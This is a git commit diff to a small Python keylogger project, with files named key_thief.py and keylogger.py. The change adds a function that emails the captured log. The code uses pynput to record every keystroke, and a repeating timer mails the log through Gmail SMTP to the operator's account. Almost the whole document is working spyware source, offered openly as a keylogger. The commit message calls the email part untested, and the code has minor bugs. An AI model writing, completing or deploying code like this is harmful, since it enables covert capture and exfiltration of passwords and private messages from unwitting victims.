55da10988e26ddfddcf0cb6d82bd57a650752406
RobertByrnes <robbyrnes@hotmail.co.uk>
2021-02-18 21:06:06 +0000

    update to keylogger script - adding as yet untested email func

--- keyLogger/key_thief.py
+++ keyLogger/key_thief.py
@@ -1,6 +1,7 @@
 #! usr/bin/env python
+# coding=utf-8
 
 import keylogger
 
-my_keylogger = keylogger.Keylogger()
-
+my_keylogger = keylogger.Keylogger(30, "user_email", "user_password")
+my_keylogger.start()
--- keyLogger/keylogger.py
+++ keyLogger/keylogger.py
@@ -1,30 +1,43 @@
 #! usr/bin/env python
-
+import smtplib
 import pynput.keyboard
 import threading
 
 
 class Keylogger:
-    def __init__(self):
-        self.log = ""
-        self.start()
+    def __init__(self, time_interval, email, password):
+        self.log = "Keylogger started..."
+        self.interval = time_interval
+        self.email = email
+        self.password = password
+
+    def append_to_log(self, string):
+        self.log = self.log + string
 
     def process_keystroke(self, key):
-        global log
         try:
-            log = log + str(key.char)
+            current_key = str(key.char)
+            self.append_to_log(current_key)
         except AttributeError:
             if key == key.space:
-                log = log + " "
+                current_key = " "
             else:
-                log = log + " " + str(key) + " "
+                current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
 
     def report(self):
-        global log
-        print(log)
-        log = ""
-        timer = threading.Timer(10, self.report)
+        print(self.log)
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
         timer.start()
+
+    def send_mail(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
 
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keystroke)
